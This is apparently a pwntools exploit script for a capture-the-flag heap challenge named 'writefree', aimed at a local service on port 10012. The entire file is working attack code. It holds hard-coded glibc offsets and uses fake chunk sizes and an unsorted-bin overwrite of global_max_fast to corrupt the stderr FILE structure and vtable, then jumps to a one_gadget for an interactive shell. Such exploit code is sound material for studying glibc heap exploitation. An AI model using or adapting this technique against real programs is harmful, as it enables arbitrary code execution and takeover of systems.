from pwn import *

context.binary = 'writefree'

s = remote('localhost', 10012)

def malloc(var, size):
  s.sendline('%s=malloc(%s)'%(var, size))
def free(var):
  s.sendline('free(%s)'%var)
def read(var, data):
  s.sendline('%s=read(%s)'%(var, len(data)))
  s.send(data)
def exit():
  s.sendline('exit(0)')

one_gadget          = 0x04f2c5
__default_morecore  = 0x09b190
call_rax            = 0x09b2a5
_IO_str_jumps       = 0x3e8360

main_arena          = 0x3ebc40
fastbinsY           = main_arena + 0x10

__morecore          = 0x3ec4d8

stderr              = 0x3ec680
_flags              = stderr + 0x00
_IO_write_ptr       = stderr + 0x28
_IO_buf_base        = stderr + 0x38
_IO_buf_end         = stderr + 0x40
vtable              = stderr + 0xd8
_allocate_buffer    = stderr + 0xe0

global_max_fast     = 0x3ed940

"""
+  0 250 tcache
+250  20 A
+270 420 B
+690  20 C
+6b0  20 D
+6d0  20 E
+6f0 420 F
+b10  20 G
+b30 430 H
+f60   - top
"""

def size_chunk(addr):
  return pack((addr-fastbinsY)*2+0x21)

def size_malloc(addr):
  return (addr-fastbinsY)*2+0x10

malloc('A', 0x10)
malloc('B', 0x410)
malloc('C', 0x10)

for addr in [
  _flags,
  _IO_write_ptr,
  _IO_buf_base,
  _IO_buf_end,
  vtable,
  _allocate_buffer,
  __morecore,
  global_max_fast-0x8,
  global_max_fast+0x8,
]:
  malloc('D', size_malloc(addr))
  free('D')
malloc('D', 0x10)

for addr in [
  _IO_buf_end,
  _allocate_buffer,
  __morecore,
]:
  malloc('E', size_malloc(addr))
  free('E')
malloc('E', 0x10)

malloc('F', 0x410)
malloc('G', 0x10)
free('F')
malloc('H', 0x420)

pad18 = b'x'*0x18

free('B')
read('A',
  pad18 +
  pack(0x421) +                   # size
  pack(0) +                       # fd
  pack(global_max_fast-0x10)[:2]) # bk
malloc('B', 0x410)

def edit(addr, tamper):
  read('C', pad18+size_chunk(addr))
  free('D')
  read('C', pad18+size_chunk(addr)+tamper)
  malloc('D', size_malloc(addr))

def copy(dst, src, tamper):
  # (1)
  read('D', pad18+size_chunk(dst))
  free('E')
  read('C', pad18+size_chunk(dst))
  free('D')
  # (2)
  read('C', pad18+size_chunk(dst)+pack(0xb0)[:1])
  # (3)
  malloc('D', size_malloc(dst))
  malloc('I', size_malloc(dst))
  read('C', pad18+size_chunk(src))
  free('D')
  # (4)
  malloc('D', size_malloc(src))
  # (5)
  read('C', pad18+size_chunk(dst)+tamper)
  malloc('D', size_malloc(dst))
  # (6)

  read('C', pad18+pack(0x21))
  free('I')
  free('D')
  read('C', pad18+pack(0x21)+pack(0xe0)[:1])
  malloc('D', 0x10)
  malloc('E', 0x10)

edit(_flags,            pack(0))
edit(_IO_write_ptr,     pack(2**64-1))
edit(_IO_buf_base,      pack(__default_morecore-one_gadget))
copy(_IO_buf_end,       __morecore,     b'')
edit(vtable,            pack(_IO_str_jumps-0x20)[:2])
copy(_allocate_buffer,  __morecore,     pack(call_rax)[:2])

edit(global_max_fast-0x8,  pack(0x421))
read('C', pad18+size_chunk(global_max_fast+0x8))
free('D')
read('E', pad18+pack(0x425))
malloc('F', 0x20)

s.interactive()
